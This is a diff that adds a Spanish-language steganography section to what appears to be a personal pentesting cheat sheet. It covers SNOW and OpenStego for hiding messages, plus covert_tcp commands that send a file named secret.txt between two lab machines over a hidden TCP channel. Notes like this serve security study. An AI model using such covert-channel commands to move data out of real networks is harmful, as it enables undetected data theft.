@@ -166,3 +166,44 @@ Denegacion de servicio
 `/usr/share/wordlists`
 
 
+## Steganography
+
+### Snow
+
+Cifrar archivo
+
+`Abrir en CMD`
+
+`SNOW.exe -C -m "Esto es para cifrar mensaje" -p "Clave" Archivo.txt Salida.txt`
+
+`Se crea archivo Salida.txt`
+
+Descifrar archivo
+
+`SNOW.exe -C -p "Clave" Salida.txt`
+
+
+### Openstego
+
+`Ejecutar Openstego`
+
+`Seleccionar descifra mensaje`
+
+`Abrir archivo, en caso de estar cifrado puede usar la URL`
+
+`https://hashes.com/en/decrypt/hash`
+
+
+
+### Covert TCP
+
+Maquina que envia
+
+`./covert_tcp -source 10.12.0.15 -dest 10.12.0.4 -source_port 9999 -dest_port 8888 -file secret.txt`
+
+Maquina que recibe
+
+`./covert_tcp -source 10.12.0.15 -source_port 8888 -server -file receive.txt`
+
+
+
